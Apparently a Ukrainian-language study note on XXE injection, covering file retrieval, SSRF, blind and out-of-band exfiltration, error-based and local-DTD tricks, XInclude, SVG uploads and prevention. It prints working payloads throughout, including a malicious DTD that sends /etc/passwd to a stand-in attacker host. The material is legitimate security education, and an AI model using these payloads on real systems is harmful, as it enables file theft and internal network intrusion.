**XML External Entity Injection (також відома як XXE)** — це вразливість веббезпеки, яка дозволяє зловмиснику втручатися в обробку XML-даних застосунком. Вона часто дає змогу атакувальнику переглядати файли у файловій системі сервера застосунку, а також взаємодіяти з будь-якими внутрішніми або зовнішніми системами, до яких має доступ сам застосунок.

У деяких випадках зловмисник може **підвищити рівень атаки XXE** та скомпрометувати базовий сервер або іншу бекенд-інфраструктуру, використовуючи XXE для виконання атак **Server-Side Request Forgery (SSRF)**.

**Як виникають вразливості XXE?** Деякі застосунки використовують формат **XML** для передавання даних між браузером і сервером. Застосунки, які працюють з XML, майже завжди використовують **стандартні бібліотеки або API платформи** для обробки XML-даних на сервері.

Вразливості **XXE** виникають через те, що **специфікація XML містить низку потенційно небезпечних можливостей**, а стандартні XML-парсери підтримують ці функції **навіть тоді, коли сам застосунок їх не потребує і не використовує***

**Які існують типи XXE-атак?**
## Exploiting XXE to retrieve files

Щоб виконати XXE-атаку, яка дозволяє отримати **довільний файл із файлової системи сервера**, необхідно змінити надісланий XML **двома способами**:

 - **Додати (або змінити) елемент DOCTYPE**, який визначає зовнішню сутність (external entity), що містить шлях до потрібного файлу.  
- **Змінити значення одного з XML-полів**, яке повертається у відповіді застосунку, щоб воно використовувало цю зовнішню сутність.

Наприклад, припустимо, що застосунок інтернет-магазину перевіряє рівень запасів товару, надсилаючи серверу такий XML:

`<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>`

Застосунок не застосовує жодних спеціальних засобів захисту від XXE-атак, тому ви можете скористатися вразливістю XXE, щоб отримати файл **/etc/passwd**, надіславши такий XXE-payload:

`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`

Цей XXE-payload визначає зовнішню сутність **&xxe;**, значенням якої є вміст файлу **/etc/passwd**, і використовує цю сутність у значенні **productId**. Це призводить до того, що відповідь застосунку містить вміст цього файлу.

## Exploiting XXE to perform SSRF attacks

Окрім отримання конфіденційних даних, іншим основним наслідком XXE-атак є те, що їх можна використовувати для виконання **Server-Side Request Forgery (SSRF)**. Це потенційно серйозна вразливість, за якої серверний застосунок може бути змушений виконувати **HTTP-запити до будь-якої URL-адреси**, до якої має доступ сервер.

Щоб скористатися XXE-вразливістю для виконання SSRF-атаки, необхідно **визначити зовнішню XML-сутність**, використовуючи URL-адресу, на яку ви хочете націлитися, і застосувати цю визначену сутність у значенні даних. Якщо ви можете використати визначену сутність у значенні даних, яке **повертається у відповіді застосунку**, тоді ви зможете переглянути відповідь з цієї URL-адреси у відповіді застосунку і, таким чином, отримати **двосторонню взаємодію з бекенд-системою**. Якщо ж ні, тоді ви зможете виконувати лише **blind SSRF-атаки** (які все одно можуть мати критичні наслідки).

У наведеному нижче прикладі XXE зовнішня сутність змусить сервер виконати **бекенд HTTP-запит до внутрішньої системи** в межах інфраструктури організації:

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`

## Blind XXE vulnerabilities

Багато випадків XXE-вразливостей є **blind**. Це означає, що застосунок **не повертає значення жодних визначених зовнішніх сутностей** у своїх відповідях, і тому **безпосереднє отримання серверних файлів неможливе**.

Blind XXE-вразливості все ще можна **виявити та експлуатувати**, але для цього потрібні **більш просунуті техніки**. Іноді можна використовувати **out-of-band (OOB) методи**, щоб знайти вразливості та використати їх для витоку даних. А іноді можна **спровокувати помилки парсингу XML**, які призводять до розкриття конфіденційних даних у повідомленнях про помилки.

--- 

Blind XXE — це ситуація, коли застосунок уразливий до XXE, але **не повертає жодних даних у відповіді**, тому результат атаки не видно напряму; щоб виявити таку вразливість, атакувальник змушує сервер **зробити мережевий запит на зовнішній сервер, який він контролює**, і якщо цей запит відбувається, це означає, що XXE спрацювала (це називається out-of-band або OAST). Наприклад, атакувальник визначає зовнішню XML-сутність з URL свого сервера і використовує її в XML-полі:

`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [   <!ENTITY xxe SYSTEM "http://attacker.com"> ]> <stockCheck>   <productId>&xxe;</productId> </stockCheck>`

Якщо сервер жертви звернеться до `attacker.com`, то, навіть без будь-яких даних у відповіді застосунку, це підтверджує наявність blind XXE-вразливості.

---

Іноді XXE-атаки з використанням **звичайних сутностей** блокуються через певну перевірку введення з боку застосунку або через посилене налаштування XML-парсера, який використовується. У такій ситуації ви можете спробувати використати **XML параметричні сутності (parameter entities)**.

XML параметричні сутності — це особливий тип XML-сутностей, на які можна посилатися **лише всередині DTD**. Для поточних цілей достатньо знати дві речі.

По‑перше, оголошення XML параметричної сутності містить **символ відсотка (%) перед ім’ям сутності**:

`<!ENTITY % myparameterentity "my parameter entity value" >`

По‑друге, параметричні сутності використовуються **за допомогою символу відсотка**, а не звичайного амперсанда:

`%myparameterentity;`

Це означає, що ви можете перевіряти blind XXE за допомогою **out‑of‑band виявлення**, використовуючи XML параметричні сутності, таким чином:

`<!DOCTYPE foo [   <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com">   %xxe; ]>`

Цей XXE‑payload оголошує XML параметричну сутність з іменем **xxe**, а потім використовує цю сутність усередині DTD. Це призведе до **DNS‑запиту та HTTP‑запиту до домену атакувальника**, що підтверджує успішність атаки.

---
**Exploiting blind XXE to exfiltrate data out-of-band**. Цей вид blind XXE‑вразливості полягає в тому, що атакувальник змушує сервер під час обробки XML завантажити зовнішній DTD, у якому описано інструкції прочитати локальний файл, наприклад `/etc/passwd`, після чого XML‑парсер сам відкриває цей файл на сервері та передає його вміст атакувальнику через мережевий запит (out‑of‑band), навіть якщо застосунок не відображає жодних даних у відповіді, що дозволяє викрадати файли з файлової системи без прямого виводу інформації на сторінку.
An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` 
`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;`

Атакувальник повинен **розмістити цей шкідливий DTD на сервері, який він контролює**, зазвичай на власному вебсервері. Наприклад, файл може бути доступний за адресою:

`http://web-attacker.com/malicious.dtd`

**XXE‑payload, який надсилається жертві**

`<!DOCTYPE foo [   <!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd">   %xxe; ]>`

---
**Використання blind XXE для отримання даних через повідомлення про помилки**

Альтернативний підхід до експлуатації blind XXE полягає у викликанні **помилки обробки XML**, у якій повідомлення про помилку містить конфіденційні дані, які ви хочете отримати. Це буде ефективно, якщо застосунок повертає отримане повідомлення про помилку у своїй відповіді.

Ви можете викликати повідомлення про помилку XML‑парсера, що містить вміст файлу `/etc/passwd`, використовуючи шкідливий зовнішній DTD таким чином:

`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;`

Цей DTD виконує такі кроки:

- Визначає XML параметричну сутність з назвою **file**, яка містить вміст файлу `/etc/passwd`.
    
- Визначає XML параметричну сутність з назвою **eval**, яка містить динамічне оголошення іншої XML параметричної сутності з назвою **error**. Сутність **error** буде обчислена шляхом спроби завантажити неіснуючий файл, назва якого містить значення сутності **file**.
    
- Використовує сутність **eval**, що призводить до виконання динамічного оголошення сутності **error**.
    
- Використовує сутність **error**, у результаті чого її значення обчислюється шляхом спроби завантажити неіснуючий файл, що призводить до появи повідомлення про помилку, яке містить назву неіснуючого файлу, тобто вміст файлу `/etc/passwd`.
    

Виклик шкідливого зовнішнього DTD призведе до повідомлення про помилку приблизно такого вигляду:

`java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...`

---

**Exploiting blind XXE by repurposing a local DTD** (потрібен локальний .dtd файл, частіше всього трапляєтьсяу Linux‑системах із середовищем GNOME, шлях /usr/share/yelp/dtd/docbookx.dtd )

Припустимо, що у файловій системі сервера існує DTD‑файл за шляхом:

`/usr/local/app/schema.dtd`

і цей файл визначає сутність з назвою `custom_entity`. Атакувальник може викликати повідомлення про помилку XML‑парсера, яке містить вміст файлу `/etc/passwd`, надіславши такий гібридний DTD:

`<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> <!ENTITY % custom_entity ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>`

---


- Визначає XML параметричну сутність **local_dtd**, яка містить вміст зовнішнього DTD‑файлу, що існує у файловій системі сервера.
    
- Переозначає XML параметричну сутність **custom_entity**, яка вже визначена у зовнішньому DTD‑файлі. Цю сутність переозначено так, щоб вона містила **error‑based XXE‑експлойт**, який викликає повідомлення про помилку з вмістом файлу `/etc/passwd`.
    
- Використовує сутність **local_dtd**, унаслідок чого зовнішній DTD інтерпретується разом із переозначеним значенням сутності `custom_entity`, що призводить до появи потрібного повідомлення про помилку.
    

---

**Пошук локального DTD‑файлу для повторного використання**

Оскільки ця XXE‑атака ґрунтується на повторному використанні наявного DTD‑файлу у файловій системі сервера, ключовою вимогою є **знайти відповідний файл**. Насправді це досить просто. Оскільки застосунок повертає всі повідомлення про помилки, згенеровані XML‑парсером, ви можете **перебирати локальні DTD‑файли**, просто намагаючись завантажити їх із внутрішнього DTD.

Наприклад, у Linux‑системах із середовищем GNOME часто існує DTD‑файл за шляхом:

`/usr/share/yelp/dtd/docbookx.dtd`

Ви можете перевірити, чи існує цей файл, надіславши такий XXE‑payload, який викличе помилку, якщо файл відсутній:

`<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>`

Після того як ви перевірите список поширених DTD‑файлів і знайдете той, що існує, вам потрібно **отримати копію цього файлу** та переглянути його, щоб знайти сутність, яку можна переозначити. Оскільки багато систем із DTD‑файлами є **open‑source**, зазвичай можна швидко отримати ці файли через пошук в інтернеті.

## Finding hidden attack surface for XXE injection
У багатьох випадках поверхня атаки для XXE-ін’єкцій є очевидною, оскільки звичайний HTTP-трафік застосунку містить запити з даними у форматі XML. В інших випадках поверхня атаки менш помітна. Однак, якщо дивитися у правильних місцях, можна знайти XXE-поверхню атаки навіть у запитах, які **не містять XML**.
## XInclude attacks

Деякі застосунки приймають дані, надіслані клієнтом, **вставляють їх на сервері в XML-документ**, а потім обробляють цей документ. Прикладом цього є ситуація, коли дані, надіслані клієнтом, вставляються у серверний SOAP-запит, який потім обробляється бекенд-SOAP-сервісом.

У такій ситуації **неможливо виконати класичну XXE-атаку**, оскільки ви не контролюєте весь XML-документ і тому не можете визначити або змінити елемент DOCTYPE. Однак замість цього **можна використати XInclude**. XInclude — це частина специфікації XML, яка дозволяє будувати XML-документ із піддокументів. Ви можете розмістити XInclude-атаку **всередині будь-якого значення даних** в XML-документі, тому атака можлива навіть тоді, коли ви контролюєте лише **одне поле даних**, яке вставляється у серверний XML-документ.

---
**Виконання XInclude-атаки**

Щоб виконати XInclude-атаку, потрібно:

- вказати простір імен XInclude;
    
- задати шлях до файлу, який ви хочете включити.
    

Наприклад:

`<foo xmlns:xi="http://www.w3.org/2001/XInclude">   <xi:include parse="text" href="file:///etc/passwd"/> </foo>`
треба це в поле вставляти, наприклад `<productId>1</productId>` замість одиниці.

## XXE attacks via file upload

Деякі застосунки дозволяють користувачам **завантажувати файли**, які потім обробляються на сервері. Деякі поширені формати файлів використовують XML або містять XML-підкомпоненти. Прикладами XML-орієнтованих форматів є **офісні документи**, такі як DOCX, та **формати зображень**, такі як SVG.

Наприклад, застосунок може дозволяти користувачам завантажувати зображення і обробляти або перевіряти їх на сервері після завантаження. Навіть якщо застосунок очікує отримати формат на кшталт PNG або JPEG, бібліотека обробки зображень, яка використовується, може підтримувати SVG-зображення. Оскільки формат SVG використовує XML, атакувальник може надіслати **шкідливе SVG-зображення** і таким чином дістатися до **прихованої поверхні атаки для XXE-вразливостей**.

Уявімо, що сайт дозволяє завантажувати **зображення**, а на сервері використовується бібліотека, яка підтримує SVG.

Атакувальник завантажує **SVG-файл**, який насправді містить XML з XXE:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="200">
  <rect width="100%" height="100%" fill="white"/>
  <text x="20" y="120"
        font-size="64"
        fill="black"
        font-family="monospace">
    &xxe;
  </text>
</svg>

```
**Коли це працює**

- сервер не забороняє SVG  
- XML-парсер не вимкнув external entities  
- файл реально обробляється, а не просто зберігається

---
**Коротко одним реченням**

> XXE через file upload виникає, коли сервер обробляє XML-формати (наприклад SVG) як «безпечні» файли, і атакувальник може сховати XXE-payload усередині такого файлу.

## XXE attacks via modified content type

Більшість POST-запитів використовують стандартний тип вмісту, який генерується HTML-формами, наприклад application/x-www-form-urlencoded. Деякі вебсайти очікують отримувати запити саме в цьому форматі, але при цьому терпимо ставляться до інших типів вмісту, зокрема до XML.

Наприклад, якщо звичайний запит виглядає так:

`POST /action HTTP/1.0`
`Content-Type: application/x-www-form-urlencoded`
`Content-Length: 7`

`foo=bar`


Тоді ви можете надіслати такий запит і отримати той самий результат:

`POST /action HTTP/1.0`
`Content-Type: text/xml`
`Content-Length: 52`

`<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`


Якщо застосунок дозволяє запити з XML у тілі і обробляє вміст тіла як XML, тоді ви можете дістатися прихованої поверхні атаки для XXE, просто переформатувавши запит у XML-формат.

## How to prevent XXE vulnerabilities

Практично всі XXE-вразливості виникають через те, що бібліотека для обробки XML у застосунку підтримує **потенційно небезпечні можливості XML**, які застосунок **не потребує і не планує використовувати**. Найпростіший і найефективніший спосіб запобігти XXE-атакам — **вимкнути ці можливості**.

Зазвичай достатньо:
- **вимкнути обробку зовнішніх сутностей**;
- **вимкнути підтримку XInclude**.

Зробити це зазвичай можна через **параметри конфігурації** або шляхом **програмного перевизначення стандартної поведінки**. Для цього слід звернутися до документації вашої бібліотеки або API для обробки XML, щоб дізнатися, як саме вимкнути непотрібні можливості.
